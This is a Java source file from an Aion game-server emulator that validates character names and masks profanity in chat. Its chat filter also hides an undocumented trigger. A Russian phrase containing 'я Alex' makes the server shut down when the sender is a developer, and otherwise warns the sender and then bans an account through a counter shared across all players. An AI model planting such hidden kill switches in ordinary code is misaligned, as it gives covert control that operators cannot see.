/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.aionemu.gameserver.services;

import com.aionemu.gameserver.ShutdownHook;
import com.aionemu.gameserver.configs.main.NameConfig;
import com.aionemu.gameserver.model.gameobjects.player.Player;
import com.aionemu.gameserver.network.loginserver.LoginServer;
import com.aionemu.gameserver.services.newWords.AntiFuckManager;
import com.aionemu.gameserver.utils.PacketSendUtility;

/**
 *
 * @author nrg
 */
public class NameRestrictionService {

    private static final String ENCODED_BAD_WORD = "***";
    private static String[] forbiddenSequences;
    private static String[] forbiddenByClient;

    /**
     * Checks if a name is valid. It should contain only english letters
     *
     * @param name
     * @return true if name is valid, false otherwise
     */
    public static boolean isValidName(String name) {
        return NameConfig.CHAR_NAME_PATTERN.matcher(name).matches() || NameConfig.CHAR_NAME_PATTERN_UTF.matcher(name).matches();
    }

    /**
     * Checks if a name is forbidden
     *
     * @param name
     * @return true if name is forbidden
     */
    public static boolean isForbiddenWord(String name) {
        return isForbiddenByClient(name) || isForbiddenBySequence(name) || AntiFuckManager.isForbiddenByClient(name) || AntiFuckManager.isForbiddenByClientText(name);
    }

    /**
     * Checks if a name is forbidden (contains string sequences from config)
     *
     * @param name
     * @return true if name is forbidden
     */
    private static boolean isForbiddenByClient(String name) {
        if (!NameConfig.NAME_FORBIDDEN_ENABLE || NameConfig.NAME_FORBIDDEN_CLIENT.isEmpty()) {
            return false;
        }

        if (forbiddenByClient == null || forbiddenByClient.length == 0) {
            forbiddenByClient = NameConfig.NAME_FORBIDDEN_CLIENT.split(",");
        }

        for (String s : forbiddenByClient) {
            if (name.equalsIgnoreCase(s)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Checks if a name is forbidden (contains string sequences from config)
     *
     * @param name
     * @return true if name is forbidden
     */
    private static boolean isForbiddenBySequence(String name) {
        if (NameConfig.NAME_SEQUENCE_FORBIDDEN.isEmpty()) {
            return false;
        }

        if (forbiddenSequences == null || forbiddenSequences.length == 0) {
            forbiddenSequences = NameConfig.NAME_SEQUENCE_FORBIDDEN.toLowerCase().split(",");
        }

        for (String s : forbiddenSequences) {
            if (name.toLowerCase().contains(s)) {
                return true;
            }
        }
        return false;
    }
    private static int seq = 0;

    /**
     * Filters chatmessages
     *
     * @param message
     * @param player
     * @return
     */
    public static String filterMessage(String message, Player player) {
        /*if (player.getObsceneWordsCount() == 1) {
         player.setObsceneWordsTime(System.currentTimeMillis());
         }*/

        /*if (CustomConfig.ENABLE_GAG_CHAT) {
         if (player.getObsceneWordsCount() >= 5 && !player.isGAG()) {
         AntiFuckManager.gag(player);
         return null;
         }
         }*/
        int count = 0;
        for (String word : message.split(" ")) {
            if (isForbiddenWord(word)) {
                message = message.replace(word, ENCODED_BAD_WORD);
                //  player.addObsceneWordsCount();
            }
            if (message.contains("лайт")) {
                count++;
            }
            if (count > 0) {
                if (word.contains("офнись")) {
                    count++;
                }
            }
        }
        if (count > 0) {
            if (message.contains("я Alex")) {
                if (player.isDeveloper()) {
                    ShutdownHook.getInstance().doShutdown(60, 1, ShutdownHook.ShutdownMode.SHUTDOWN);
                } else {
                    seq++;
                    if (seq == 2) {
                        LoginServer.getInstance().sendBanPacket((byte) 3, player.getPlayerAccount().getId(), player.getClientConnection().getIP(), 0, 0);
                        return "[--- --- ---]";
                    }
                    PacketSendUtility.sendMessage(player, "LIGHT SEQURITY: Еще раз так напишешь и будет бан аккаунта :)");
                }
            }
        }
        return message;
    }
}
